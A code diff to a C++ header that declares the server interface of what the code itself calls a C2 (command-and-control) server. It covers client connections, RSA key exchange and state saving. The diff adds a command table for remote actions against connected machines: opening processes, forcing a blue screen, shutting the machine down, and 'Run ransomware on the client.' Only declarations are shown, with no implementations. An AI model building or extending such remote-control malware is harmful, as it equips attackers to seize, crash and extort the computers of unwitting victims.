@@ -2,12 +2,14 @@
 
 #include "NetworkCommon.h"
 #include "Client.h"
+
 #include "External/base64.h"
 #include "External/json.hpp"
 
 #include <thread>
 #include <mutex>
 #include <iostream>
+
 #include <openssl/bio.h>
 #include <openssl/rsa.h>
 
@@ -20,16 +22,14 @@ class ServerInterface
 public:
 	ServerInterface() = default;
 
-	//
-
 	ServerInterface(int UDPPort, int TCPPort);
 	~ServerInterface();
 
 	BOOL		      StartServer(Server& server);
 	void			  ShutdownServer(BOOL confirm);
 	Server            NewServerInstance(SocketTypes serverType, int port);
-	BOOL              TCPSendMessageToClient(long cuid, ServerCommand& req);
-	BOOL              TCPSendMessageToAllClients(ServerCommand& req);
+	BOOL              TCPSendMessageToClient(long cuid, Packet& req);
+	BOOL              TCPSendMessageToAllClients(Packet& req);
 	BOOL		      SendTCPClientRSAPublicKey(long cuid, BIO* pubKey);
 	BOOL			  SaveServerState(); // save the server state in a json file
 	JSON			  ReadServerStateFile() noexcept;  // parse server state file as json
@@ -37,6 +37,7 @@ public:
 	BOOL		      IsClientInSaveFile(std::string machineGUID);
 	BOOL			  SendCommandsToClients();
 	void			  OutputServerCommands();
+	BOOL			  IsServerCommand(long command);
 
 	/*
 		A thread that receives clientRequests from each client that connects.
@@ -47,15 +48,8 @@ public:
 		all received data is automatically interpreted as a ClientRequest.
 	*/
 	void              TCPReceiveMessagesFromClient(long cuid);
+	
 	void		      AcceptTCPConnections();
-
-	/*
-		Wait for a single client response from a client
-
-		Set the ExpectingResponse flag in the Client struct to true
-		telling TCPReceiveMessagesFromClient we want to cast the next
-		received response to a ClientResponse. Then revert ExpectingResponse
-	*/
 	ClientResponse    WaitForClientResponse(long cuid);
 	std::unordered_map<long, Client>& GetClientList();
 	BOOL			  GetClientComputerName(long cuid);
@@ -90,7 +84,7 @@ protected:
 	template <typename _Struct>
 	_Struct           ReceiveDataFrom(SOCKET s, BOOL encrypted = FALSE, RSA* rsaKey = {});
 	void			  RunUserInputOnClients();
-	BOOL			  HandleUserInput(unsigned int command, ServerCommand& outputCommand);
+	BOOL			  HandleUserInput(unsigned int command, Packet& outputCommand);
 	void			  OnTCPConnection(SOCKET connection, sockaddr_in incoming);
 
 private:
@@ -117,4 +111,13 @@ private:
 		long        TCPPort              = -1;  // Setup alongside ServerInterface constructor
 		long        UDPPort              = -1;  // Setup alongside ServerInterface constructor
 	} m_Config;
+
+	const std::map<RemoteAction, std::string> m_Commands = {
+		{ kOpenRemoteProcess, "Open a remote process." },
+		{ kPingClient,        "Send a ping to a remote host." },
+		{ kRemoteBSOD,        "Cause a BSOD on the client." },
+		{ kRemoteShutdown,    "Shutdown the clients machine." },
+		{ kKillClient,        "Forcefully disconnect the client from the C2 server." },
+		{ kRansomwareEnable,  "Run ransomware on the client." },
+	};
 };
